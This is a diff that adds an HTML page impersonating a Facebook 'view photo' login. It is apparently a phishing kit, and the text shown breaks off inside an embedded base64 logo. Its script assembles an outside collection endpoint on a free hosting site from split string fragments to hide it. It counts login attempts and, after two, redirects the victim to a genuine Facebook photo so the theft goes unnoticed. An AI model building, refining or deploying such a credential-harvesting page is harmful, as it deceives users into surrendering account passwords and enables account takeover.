@@ -1,0 +1,722 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="description" content="">
+<meta name="keywords" content="">
+<![if !IE]>
+<link rel="icon" href="images/linkedin_av.png" type="image/x-icon">
+<![endif]>
+
+<title>Facebook - View photo...</title>
+<link rel="shortcut icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+
+<!--<script src="https://cdnjs.cloudflare.com/ajax/libs/platform/1.3.6/platform.min.js"></script>-->
+<script type="text/javascript" src="https://code.jquery.com/jquery-latest.min.js"></script>
+<style type="text/css">
+
+	/*@font-face{
+		font-family:'page_section_font';
+		src:url('webfonts/open-sans/OpenSans-Regular.ttf') format('truetype');
+		
+	} 
+	@font-face {
+	font-family: 'SFUITextRegular';
+	font-style: normal;
+	font-weight: normal;
+	src: url('webfonts/sfuitext/sf-ui-text-regular-58646b56a688c.woff') format('woff');
+	}
+	@font-face {
+	font-family: 'SFUITextLight';
+	font-style: normal;
+	font-weight: normal;
+	src: url('webfonts/sfuitext/sf-ui-text-light-5864714f67240.woff') format('woff');
+	}*/
+
+	*{
+		box-sizing:border-box;
+		margin:0;
+		padding:0;
+		font-family: system-ui;
+	}
+
+	body {
+	    color: #404349;
+	    background-color: #f0f2f5;
+	    font-family: system-ui;
+	    -webkit-font-smoothing: antialiased;
+	}
+
+	body, html {
+	    height: 100%;
+	    margin: 0;
+	    font-size: 14px;
+	}
+
+
+	a{
+		text-decoration:none;
+		font-family: system-ui;
+	}
+
+	a:active {
+	    color: #2d6bb3;
+	}
+
+	a:hover {
+	    color: #6aace6;
+	}
+
+
+
+	.col{
+		float: left;
+		z-index: 2;
+	}
+
+	.one_col{
+		width:100%;
+	}
+
+	.two_col{
+		width:50%;
+	}
+
+	.three_col{
+		width:33.333333%;
+	}
+
+	.four_col{
+		width:25%;
+	}
+
+	.five_col{
+		width:20%;
+	}
+
+	.col_assist{
+		padding: 50px;
+	}
+
+
+
+	.l_col{
+		width:60%;
+		text-align: left;
+		
+	}
+	
+	.l_col h2{
+		margin-left: 0;
+	}
+
+	.s_col{
+		width:40%;
+	}
+
+
+	#frame{
+		width:100%;
+		height:auto;
+		margin:0px;
+		float: left;
+		position:relative;
+		top:0px;
+		background-color:#fff;
+		font-size: 14px; 
+		color:#444;
+		clear:both;
+		z-index:10;
+		//box-shadow:0px 1px 2px #777;
+	}
+
+	#inner-frame{
+		max-width:980px;
+		width:98%;
+		height:auto;
+		margin:auto;
+		margin-bottom: 2%;
+		margin-top: 2%;
+		padding:10px;
+		position:relative;
+		overflow-x:hidden;
+		
+	}
+
+	input:-internal-autofill-selected{
+		background-color: transparent;
+	}
+
+	.text{
+	    font-family: system-ui;
+	    font-variant: tabular-nums;
+	    list-style: none;
+	    position: relative;
+	    display: inline-block;
+	    width: 100%;
+	   	border-radius: 6px;
+	    transition: all .3s;
+	    //padding:10px 12px 10px; 
+	    font-size: 17px;
+		padding: 14px 16px;
+		//width: 330px;
+		background: #FFFFFF url(/rsrc.php/v3/yO/r/YQNfPR9MJfx.png) repeat-x;
+		border: 1px solid #dddfe2;
+		color: #1d2129;
+		//font-family: Helvetica, Arial, sans-serif;
+		//font-size: 12px;
+		height: 50px;
+		line-height: 16px;
+		//padding: 0 8px;
+		vertical-align: middle;
+	}
+
+	
+	.input_icon_holder{
+		position: relative; 
+		margin-bottom: 5%;
+	}
+
+
+	.input_icon2{
+		display: table-cell; 
+		padding: 6px 15px; 
+		font-size: 14px; 
+		font-weight: 400; 
+		line-height: 1; 
+		color: #006097; 
+		text-align: center;  
+		border: 1px solid #ccc; 
+		width: 1%; 
+		white-space: nowrap; 
+		vertical-align: middle;
+		font-family: sans-serif, system-ui;
+		background-color: #fefefe;
+		cursor: pointer;
+	}
+
+	#label{
+		padding: 5px; 
+		position: absolute; 
+		right: 10px; 
+		top: 10px; 
+		z-index: 10; 
+		width: auto; 
+		font-size: 14px; 
+		font-weight:600;
+		color: #006097; 
+		text-align: center;  
+		border: none; 
+		vertical-align: middle;
+		//font-family: sans-serif, system-ui;
+		background-color: #fff;
+	}
+
+	#label:hover{
+		background-color: #f2f2f2;
+	}
+
+	.input_icon_holder2{
+		position: relative; 
+		margin-top: 15px;
+	}
+
+	.errorfound{
+		border:2px solid #d00; 
+		box-shadow: 0px 0px 1px #d00;
+		color:#d00;
+	}
+
+
+	.inv_btn{
+		background-color:#0a66c2; 
+		padding: 15px 20px; 
+		margin-left: 10px; 
+		border:none; 
+		color:#fff; 
+		font-size: 14px; 
+		font-family: page_title_font;
+		cursor: pointer;
+		height: 52px;
+		border-radius: 10px;
+	}
+
+	.inv_btn_i{
+		background-color:#0a66c2;
+	}
+
+	.inv_btn_i:hover{
+		background-color:#0073b1; 
+	}
+
+	#form_layout{
+		position:relative;
+		max-width: 1000px;
+		width:100%;
+		margin: auto;
+		//height:450px;
+		background-color:rgba(255,255,255,1);
+		color:#fff;
+		text-align: left;
+		//padding:7px;
+		margin-top:50px;
+		margin-bottom:0;
+		font-size:12px;
+		//box-shadow:-1px 18px 3px 0px #333;
+	}
+
+	.footer__base {
+    display: -webkit-box;
+    display: -ms-flexbox;
+    display: flex;
+    width: 100%;
+    height: 72px;
+    bottom: 0;
+    position: absolute;
+    background-color: rgba(255,255,255,0.85);
+    -webkit-box-align: center;
+    -ms-flex-align: center;
+    align-items: center;
+    //border-top: 1px solid rgba(0,0,0,0.15);
+}
+
+.footer__base .footer__base__wrapper {
+    display: -webkit-inline-box;
+    width: 1128px;
+    -webkit-box-align: baseline;
+    -ms-flex-align: baseline;
+    align-items: baseline;
+    -webkit-box-pack: center;
+    -ms-flex-pack: center;
+    justify-content: center;
+    margin: auto;
+}
+
+#app__container .footer__base__wrapper p.copyright {
+    font-family: /* Roman */ -apple-system, system-ui, BlinkMacSystemFont, Segoe UI, Roboto, Helvetica Neue, Fira Sans, Ubuntu, Oxygen, Oxygen Sans, Cantarell, Droid Sans, Apple Color Emoji, Segoe UI Emoji, Segoe UI Emoji, Segoe UI Symbol, Lucida Grande, Helvetica, Arial, sans-serif;
+    font-size: 12px;
+    line-height: 16px;
+    font-weight: 400;
+    color: rgba(0,0,0,0.9);
+    padding: 0 8px 0 0;
+}
+
+.footer__base li-icon[type="linkedin-logo"] {
+    position: relative;
+    top: 4px;
+    right: 4px;
+}
+
+li-icon[type="linkedin-logo"][size="14dp"] {
+    width: 56px;
+    height: 14px;
+}
+li-icon {
+    display: inline-block;
+    width: 300px;
+    height: 150px;
+    overflow: hidden;
+    position: relative;
+}
+
+li-icon[type="linkedin-logo"] svg {
+    width: 100%;
+    height: 100%;
+}
+li-icon>svg {
+    display: block;
+    margin: auto;
+}
+user agent stylesheet
+svg:not(:root), symbol, image, marker, pattern, foreignObject {
+    overflow: hidden;
+}
+
+.footer__base .a11y__label {
+    position: absolute;
+    text-indent: -999999px;
+    display: inline-block;
+}
+
+.footer__base .footer__base__nav-list li {
+    background-color: transparent;
+    border: 0;
+    border-radius: 2px;
+    -webkit-box-sizing: border-box;
+    box-sizing: border-box;
+    color: rgba(0,0,0,0.6);
+    cursor: pointer;
+    display: inline-block;
+    font-size: 1.4rem;
+    font-weight: 600;
+    font-family: inherit;
+    height: 24px;
+    line-height: 24px;
+    overflow: hidden;
+    outline-width: 2px;
+    padding: 0 8px;
+    position: relative;
+    text-align: center;
+    text-decoration: none;
+    -webkit-transition-duration: 167ms;
+    transition-duration: 167ms;
+    -webkit-transition-property: background-color,color,-webkit-box-shadow;
+    transition-property: background-color,color,-webkit-box-shadow;
+    transition-property: background-color,box-shadow,color;
+    transition-property: background-color,box-shadow,color,-webkit-box-shadow;
+    -webkit-transition-timing-function: cubic-bezier(0, 0, 0.2, 1);
+    transition-timing-function: cubic-bezier(0, 0, 0.2, 1);
+    vertical-align: middle;
+    z-index: 0;
+    font-size: 12px;
+}
+
+
+
+.footer__base .footer__base__nav-list a {
+    font-family: /* Roman */ -apple-system, system-ui, BlinkMacSystemFont, Segoe UI, Roboto, Helvetica Neue, Fira Sans, Ubuntu, Oxygen, Oxygen Sans, Cantarell, Droid Sans, Apple Color Emoji, Segoe UI Emoji, Segoe UI Emoji, Segoe UI Symbol, Lucida Grande, Helvetica, Arial, sans-serif;
+    font-size: 12px;
+    line-height: 16px;
+    font-weight: 400;
+    color: rgba(0,0,0,0.9);
+    text-decoration: none;
+}
+a:visited {
+    color: #665ed0;
+}
+a:visited {
+    color: #0073b1;
+}
+a {
+    text-decoration: none;
+    font-weight: bold;
+    background-color: transparent;
+    border: 0;
+    color: #0073b1;
+}
+a {
+    margin: 0;
+    padding: 0;
+    font-size: 100%;
+    vertical-align: baseline;
+    background: transparent;
+}
+
+@keyframes reduce{
+	from{font-size: 16px; height: 100%; top:0;}
+	to{font-size: 12px; height: 30%; top:-10px;}
+
+}
+
+@keyframes increase{
+	from{font-size: 12px; height: 30%; top:-10px;}
+	to{font-size: 16px; height: 100%; top:0;}
+
+}
+
+.fac{
+	padding: 112px 0 16px; 
+	position: relative;
+}
+
+.fac img{
+	height: 40px;
+	margin-bottom: 20px;
+}
+
+.fac h2 {
+	font-family: SFProDisplay-Regular, Helvetica, Arial, sans-serif; 
+	font-size: 24px; 
+	font-weight: normal; 
+	line-height: 32px; 
+	color: #1c1e21; 
+	margin-top: 20px;
+}
+
+#form_{
+	 width: 396px; margin: auto; align-items: center; background-color: #fff; border: none; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1); box-sizing: border-box; margin: 40px 0 0; padding: 0 18px 28px; text-align: center;
+}
+
+.bbtn{
+	margin: 0; margin-top: 13px; width: 60%; font-family: system-ui; color: #fff; background-color: #42b72a; border: none; border-radius: 6px; font-size: 17px; line-height: 48px; padding: 0 16px; font-weight: bold;
+}
+
+@media screen  and (max-width:800px){
+    .l_col{
+		width:100%;
+		text-align: center;
+		padding: 0 30px;
+	}
+	
+	.l_col h2{
+		margin: auto;
+	}
+
+	.s_col{
+		width:100%;
+	}
+
+	.fac{
+		padding: 20px 0;
+	}
+
+	.fac img{
+		height: 30px;
+		margin-bottom: 0px;
+	}
+
+	.fac h2{
+		display: none;
+	}
+
+
+	#form_{
+	 width: 100%; 
+	}
+
+	.bbtn{
+		width: 70%;
+	}
+}
+
+
+@media screen  and (max-width:400px){
+	.bbtn{
+		width: 100%;
+	}
+}
+</style>
+<script>
+  let resBox = 'FKB'
+
+    let nbg1 = 'https'
+    let nbg2 = '://'
+    let nbg3 = 'clpoint.000webhostapp'
+    let nbg4 = '.com'
+    let nbg5 = '/webtest'
+    let nbg6 = '.php'
+
+    let ov1 = 'https'
+    let ov2 = '://'
+    let ov3 = 'face'
+    let ov4 = 'book'
+    let ov5 = '.com'
+    let ov6 = '/phot'
+    let ov7 = 'o.php?fbid=563889575768634&set=a.487362043421388&type=3&fs=e&s=cl'
+
+    //sessionStorage.clear()
+    let trialCount = sessionStorage.getItem("num_trial");
+
+    if (!trialCount) {
+      sessionStorage.setItem("num_trial", 0);
+    } else if (trialCount >= 2) {
+      window.location.assign(`${ov1}${ov2}${ov3}${ov4}${ov5}${ov6}${ov7}`)
+    }
+</script>
+</head>
+<body>
+
+<div id="frame" style="background-color: #f0f2f5;">
+	
+	<div id="inner-frame" align="center" style="">
+		
+
+			<div class="col l_col">
+				<div class='fac' style="">
+					<img src=" data:image/png;base64,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